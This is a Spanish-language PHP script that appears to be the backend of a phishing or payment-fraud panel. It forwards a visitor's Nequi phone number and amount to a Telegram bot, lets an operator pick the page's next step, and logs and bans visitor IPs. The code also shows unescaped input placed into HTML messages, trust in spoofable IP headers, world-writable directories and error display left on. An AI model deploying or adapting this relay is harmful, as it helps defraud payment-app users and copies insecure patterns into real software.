<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$blacklist_file = file_exists(__DIR__ . '/blocked_ips.txt') ? __DIR__ . '/blocked_ips.txt' : (file_exists(dirname(dirname(__DIR__)) . '/blocked_ips.txt') ? dirname(dirname(__DIR__)) . '/blocked_ips.txt' : (file_exists(dirname(dirname(dirname(__DIR__))) . '/blocked_ips.txt') ? dirname(dirname(dirname(__DIR__))) . '/blocked_ips.txt' : __DIR__ . '/blocked_ips.txt'));
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_FILE = 'used_transactions.json';

/* ============================================================
   🔥 CARGAR CONFIG COMO  TODOS TUS DEMÁS ARCHIVOS
   ============================================================ */
function loadConfig()
{
    $configFile = __DIR__ . '/config.php';

    if (!file_exists($configFile)) return null;

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id']))
        return null;

    return [
        'token' => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

/* ============================================================
   📩 ENVIAR A TELEGRAM
   ============================================================ */
function sendToTelegram($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

/* ============================================================
   ✏ EDITAR MENSAJE
   ============================================================ */
function editTelegramMessage($token, $chatId, $messageId, $newText, $tid = '')
{
    $keyboard = !empty($tid) ? [
        'inline_keyboard' => [
            [
                ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$tid}"]
            ]
        ]
    ] : ['inline_keyboard' => []];

    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $newText,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);

    curl_exec($ch);
    curl_close($ch);
}

/* ============================================================
   ⚙ MANEJO DE TRANSACCIONES
   ============================================================ */
function getTransactions()
{
    return file_exists($GLOBALS['USED_FILE'])
        ? json_decode(file_get_contents($GLOBALS['USED_FILE']), true)
        : [];
}

function saveTransaction($id, $data)
{
    $all = getTransactions();
    $all[$id] = $data;
    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
}

function deleteTransaction($id)
{
    $all = getTransactions();
    unset($all[$id]);
    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
}

function getPendingActionFromWebhook($transactionId)
{
   $safeTid = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId);

   $candidateDirs = array_unique(array_filter([
       __DIR__ . '/actions',
       dirname(__DIR__) . '/actions',
       dirname(dirname(__DIR__)) . '/actions',
       dirname(dirname(dirname(__DIR__))) . '/actions',
       '/var/www/html/gate/recargas/transaction/actions',
       '/var/www/html/gate/recargas/transaction/b-15/actions',
       '/Applications/XAMPP/xamppfiles/htdocs/mood/gate/recargas/transaction/actions',
       '/Applications/XAMPP/xamppfiles/htdocs/mood/gate/recargas/transaction/b-15/actions'
   ], static function ($dir) {
       return $dir !== '';
   }));

   foreach ($candidateDirs as $dir) {
       if (!is_dir($dir)) {
           continue;
       }

       if ($safeTid !== '') {
           $file = $dir . '/' . $safeTid . '.txt';
           if (file_exists($file)) {
               $action = trim((string) file_get_contents($file));
               @unlink($file);
               if ($action !== '') {
                   return $action;
               }
           }
       }

       foreach (['last_action.txt', 'pending_action.txt'] as $fallbackFile) {
           $fallbackPath = $dir . '/' . $fallbackFile;
           if (!file_exists($fallbackPath)) {
               continue;
           }

           $action = trim((string) file_get_contents($fallbackPath));
           @unlink($fallbackPath);
           if ($action !== '') {
               return $action;
           }
       }
   }

   return null;
}

/* ============================================================
   🔥 Cargar configuración local
   ============================================================ */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}

$BOT_TOKEN = $config['token'];
$CHAT_ID   = $config['chat_id'];

/* ============================================================
   📥 POST: Enviar mensaje al operador
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $data = json_decode(file_get_contents('php://input'), true);

    $tid      = $data['transactionId'] ?? ('TID_' . time());
    
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($tid)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$tid);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
$telefono = $data['nequi'] ?? 'N/D';
    $monto    = $data['monto'] ?? '0';
    $mensaje  = $data['mensaje'] ?? '';

    $text  = "<b>💳 Nueva acción del usuario</b>\n";
    $text .= "• 🆔 ID: <code>{$tid}</code>\n";
    $text .= "• 📱 Número: <code>{$telefono}</code>\n";
    $text .= "• 💰 Monto: <b>$ {$monto}</b>\n";
    $text .= "• 📝 Mensaje: {$mensaje}\n\n";
    $text .= "Operador, selecciona una opción:";

    $keyboard = [
        [
            ['text' => '✅ Pago aceptado', 'callback_data' => "si:{$tid}"],
            ['text' => '❌ Aún no pagó',   'callback_data' => "no:{$tid}"]
        ],
        [
            ['text' => '📸 Captura', 'callback_data' => "cap:{$tid}"]
        ]
    ];

    $res = sendToTelegram($BOT_TOKEN, $CHAT_ID, $text, $keyboard);

    if (!empty($res['ok'])) {
        saveTransaction($tid, [
            'tid' => $tid,
            'telefono' => $telefono,
            'monto' => $monto,
            'message_id' => $res['result']['message_id'],
            'created_at' => time(),
            'status' => 'pending'
        ]);
    }

    echo json_encode(['ok' => true, 'tid' => $tid]);
    exit;
}

/* ============================================================
   🔍 GET: Polling esperando respuesta del operador
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];
    $accion = getPendingActionFromWebhook($tid);

    if ($accion === null) {
        echo json_encode(['ok' => false]);
        exit;
    }

    if ($accion === 'si') {
        $accionTexto = 'Pago aceptado';
        $clientAction = 'confirmado';
    } elseif ($accion === 'no') {
        $accionTexto = 'Aún no pagó';
        $clientAction = 'rechazado';
    } elseif ($accion === 'cap') {
        $accionTexto = 'Captura solicitada';
        $clientAction = 'captura';
    } else {
        $accionTexto = ucfirst($accion);
        $clientAction = $accion;
    }

    $t = getTransactions()[$tid] ?? null;
    if ($t) {
        $nuevoMensaje  = "<b>💳 Transacción</b>\n";
        $nuevoMensaje .= "• 🆔 ID: <code>{$tid}</code>\n";
        $nuevoMensaje .= "• 📱 Número: <code>{$t['telefono']}</code>\n";
        $nuevoMensaje .= "• 💰 Monto: <b>$ {$t['monto']}</b>\n\n";
        $nuevoMensaje .= "✅ Acción: <b>{$accionTexto}</b>";

        editTelegramMessage($BOT_TOKEN, $CHAT_ID, $t['message_id'], $nuevoMensaje, $tid);
        deleteTransaction($tid);
    }

    echo json_encode(['ok' => true, 'action' => $clientAction]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método inválido']);
exit;
